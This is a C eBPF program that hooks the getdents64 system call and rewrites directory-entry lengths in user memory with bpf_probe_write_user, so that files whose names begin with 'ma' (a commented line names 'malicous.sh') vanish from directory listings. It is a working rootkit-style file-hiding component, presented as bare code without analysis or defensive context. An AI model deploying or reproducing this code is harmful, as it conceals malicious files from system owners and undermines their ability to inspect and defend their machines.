#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <string.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, size_t);
  __type(value, long unsigned int);
} map_buffs SEC(".maps");

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ };
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int
// count);
SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    struct linux_dirent64 *dent = (struct linux_dirent64 *)ctx->args[1];
    unsigned short d_reclen;
    char filename[32];
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dent->d_reclen);
    bpf_probe_read_user(filename, 32, &dent->d_name);
    bpf_printk("origin buff_addr: %p\n", dent);
    bpf_printk("origin dentry size: %ld, dentry name: %s\n", d_reclen, filename);
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dent, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    if (ctx->ret < 0)
        return 0;

    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0)
        return 0;

    size_t prevpos = 0, bpos = 0;
    unsigned short prevlen = 0, d_reclen = 0;
    char filename[32];
    for (int i = 0; i < 200; i++) {
        if (bpos >= ctx->ret)
            break;

        struct linux_dirent64 * dent = (struct linux_dirent64 *)(*pbuff_addr + bpos);

        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dent->d_reclen);
        bpf_probe_read_user(filename, 32, &dent->d_name);

        if (filename[0] == 'm' && filename[1] == 'a') {
        /* if (strcmp(filename, "malicous.sh") == 0) { */
            struct linux_dirent64 * prevent = (struct linux_dirent64 *)(*pbuff_addr + prevpos);
            unsigned short newlen = prevlen + d_reclen;
            bpf_probe_write_user(&prevent->d_reclen, &newlen, sizeof(newlen));
            break;
        }

        /* bpf_printk("dentry size: %ld, dentry name: %s\n", d_reclen, filename); */
        prevlen = d_reclen;
        prevpos = bpos;
        bpos += d_reclen;
    }

    bpf_map_delete_elem(&map_buffs, &pid_tgid);
    return 0;
}
